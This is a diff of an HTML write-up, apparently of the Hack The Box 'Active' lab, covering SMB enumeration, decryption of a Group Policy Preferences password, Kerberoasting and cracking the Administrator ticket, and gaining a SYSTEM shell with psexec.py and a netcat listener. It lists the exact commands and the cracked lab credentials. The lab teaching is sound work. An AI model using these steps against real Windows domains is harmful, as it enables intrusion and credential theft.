@@ -22,6 +22,7 @@
     <p>I got a lot of ports open</p>
     <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250609204628.png">
 
+    <h3 class="step-header">2. Server Message Block (SMB) Enumeration </h3>
     <p>I started by enumerating the smb shares anonymously.</p>
     <div class="terminal-box">
     smbclient -N -L \\\\10.10.10.100
@@ -47,11 +48,9 @@
 
     <div class="terminal-box">smbclient -N \\\\10.10.10.100\\Replication</div>
 
-    <p>The one that was more important for me it was the 'Groups.xml' file which was under here :</p>
+    <p>The one that was more important for me it was the 'Groups.xml' file which could be found here :</p><br>
     <p><code>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</code></p>
-    
-    <p>This is the contents of the 'Groups.xml' file.</p>
-    <div class="terminal-box">
+        <div class="terminal-box">
         <xmp>
             <?xml version="1.0" encoding="utf-8"?>
             <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
@@ -119,14 +118,11 @@
     <div class="terminal-box">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</div>
 
     <p>Now I can join and get the user flag via the smb shares.</p>
-    <div class="terminal-box">
-    smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+    <div class="terminal-box">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
     </div>
     <p>Or with this command.</p>
-    <div class="terminal-box">
-    smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
-
-    smb: \SVC_TGS\desktop\> get user.txt
+    <div class="terminal-box">smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+        smb: \SVC_TGS\desktop\> get user.txt
     </div>
     
     <fieldset class="root-box">
@@ -141,10 +137,9 @@
     <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100</div>
 
     <p>I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS  Kerberos service ticket .</p>
-   <div class="terminal-box">
-    active/CIFS:445       
-    Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 
-    2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571 
+   <div class="terminal-box">active/CIFS:445
+       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
+       2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571 
    </div>
 
    <p>I want to extract the Administrator's hash, and I use the '-request' flag.</p>
@@ -152,15 +147,12 @@
    <p>Where I get this response :</p>
    <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250610001134.png">
    <p>I cracked the hash by using John The Ripper tool :</p>
-   <div class="terminal-box">
-    ~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
-
-    Ticketmaster1968
+   <div class="terminal-box">~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
+       Ticketmaster1968
    </div>
 
    <p>The next tool that I used was the <code>psexec.py</code> to get the SYSTEM shell :</p>
-   <div class="terminal-box">
-    psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
+   <div class="terminal-box">psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
    </div>
 
     <div class="terminal-box">nc -lvnp 4446</div>
@@ -172,9 +164,7 @@
 
     <h3 class="step-header">4. Privilege Escalation - Second way</h3>
     <p>We can use <code>smbmap</code> tool to print us the shares, what permissions we have and to get the flag :</p>
-    <div class="terminal-box">
-    smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
-
-    smb: \> get \users\administrator\desktop\root.txt
+    <div class="terminal-box">smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+        smb: \> get \users\administrator\desktop\root.txt
     </div>
 </div>
